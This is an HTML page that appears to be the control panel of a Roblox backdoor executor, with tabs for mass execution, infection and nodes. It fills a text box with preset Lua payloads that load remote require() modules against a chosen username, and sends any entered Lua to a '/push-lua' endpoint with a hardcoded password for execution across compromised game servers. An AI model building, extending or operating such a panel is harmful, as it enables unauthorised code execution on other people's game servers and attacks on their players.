<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nexus  | Legacy</title>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .panel { background: #1c1c1e; padding: 30px; border-radius: 18px; width: 500px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .tabs { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }
        .tab { color: #86868b; cursor: pointer; font-size: 13px; font-weight: 500; transition: 0.2s; }
        .tab.active { color: #fff; border-bottom: 2px solid #0071e3; padding-bottom: 2px; }
        h2 { margin-top: 0; font-weight: 600; font-size: 20px; text-align: center; }
        .btn-group { display: flex; gap: 8px; margin-bottom: 12px; }
        .pill { background: #3a3a3c; border: none; color: #fff; padding: 6px 12px; border-radius: 20px; font-size: 11px; cursor: pointer; }
        .pill:hover { background: #0071e3; }
        textarea, input { width: 100%; background: #000; border: 1px solid #424245; border-radius: 10px; color: #fff; padding: 12px; margin-bottom: 15px; box-sizing: border-box; font-family: monospace; outline: none; }
        .exec-btn { background: #0071e3; color: #fff; border: none; width: 100%; padding: 14px; border-radius: 12px; font-weight: 600; cursor: pointer; font-size: 15px; }
        .exec-btn:active { background: #005bb5; }
        .footer-btns { position: fixed; bottom: 20px; left: 20px; display: flex; gap: 10px; }
        .f-btn { background: #2c2c2e; border: none; color: #fff; padding: 8px 16px; border-radius: 10px; font-size: 12px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="panel">
        <div class="tabs">
            <span class="tab active">Mass</span>
            <span class="tab">Single</span>
            <span class="tab">Infection</span>
            <span class="tab">Nodes</span>
        </div>

        <h2>Mass Execution</h2>
        
        <div class="btn-group">
            <button class="pill" onclick="setLua(1)">Last Rig</button>
            <button class="pill" onclick="setLua(2)">Require.EXE</button>
            <button class="pill" onclick="setLua(3)">Darius (OP)</button>
        </div>

        <input type="text" id="target_user" placeholder="Username (for scripts)">
        <textarea id="lua_box" rows="8" placeholder="-- Enter Lua Code Here"></textarea>
        
        <button class="exec-btn" onclick="fire()">Execute All</button>
    </div>

    <div class="footer-btns">
        <button class="f-btn" onclick="document.getElementById('m').play()">PLAY</button>
        <button class="f-btn" style="color: #ff3b30;" onclick="document.getElementById('m').pause()">STOP</button>
    </div>

    <audio id="m" loop src="https://cdn.discordapp.com/attachments/1459510270870421546/1492178549317308426/Wont_Stop_Us_-_StacyBurke92_g00byd0lan_KLICKAUD.mp3?ex=69da6311&is=69d91191&hm=f174788afceacbba804576a6c0e91386a5e3a077bacbedbc981032a8ec393a1c&"></audio>

    <script>
        function setLua(type) {
            const user = document.getElementById('target_user').value || "Player";
            const box = document.getElementById('lua_box');
            if(type === 1) box.value = `require(132155655397653)("${user}")`;
            if(type === 2) box.value = `require(125992639027440)["Require.EXE by E God"]("${user}")`;
            if(type === 3) box.value = `require(127445614272366).op("${user}")`;
        }

        async function fire() {
            const code = document.getElementById('lua_box').value;
            const res = await fetch('/push-lua', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    lua: code,
                    password: "Alt"
                })
            });
            if(res.ok) alert("Sent!");
            else alert("Error: Check if server is running.");
        }
    </script>
</body>
</html>
